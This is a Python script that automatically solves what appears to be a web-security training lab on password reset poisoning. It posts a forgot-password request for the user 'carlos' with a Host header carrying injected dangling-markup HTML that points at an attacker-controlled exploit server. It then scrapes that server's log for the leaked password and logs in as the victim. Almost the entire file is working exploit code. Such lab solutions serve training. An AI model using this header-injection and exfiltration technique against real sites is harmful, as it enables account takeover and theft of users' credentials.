import requests
import re
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.exploit_server_url = None
        self.password = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def get_exploit_server_url(self):
        response = self.session.get(self.lab_url)
        self.exploit_server_url = re.search(r'href=\'(https://exploit-.*?)\'', response.text).group(1)

    def forget_carlos_password(self):
        cookies = {}
        for key, value in self.session.cookies.items():
            cookies[key] = value
        data = {
            'csrf': self.get_csrf_token('forgot-password'),
            'username': 'carlos'
        }
        headers = {
            'Host': self.lab_url.replace('https://', '').rstrip('/') + ':\'><img src="' + self.exploit_server_url + '/victim/?'
        }
        requests.post(self.lab_url + 'forgot-password', data=data, headers=headers, cookies=cookies)

    def get_logs(self):
        response = requests.get(self.exploit_server_url + '/log')
        self.password = re.findall(r'victim.*password:\+(.*?)&', response.text)[-1]

    def sing_in_as_carlos(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'carlos',
            'password': self.password
        }
        self.session.post(self.lab_url + 'login', data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_exploit_server_url()
        self.forget_carlos_password()
        time.sleep(10)
        self.get_logs()
        self.sing_in_as_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
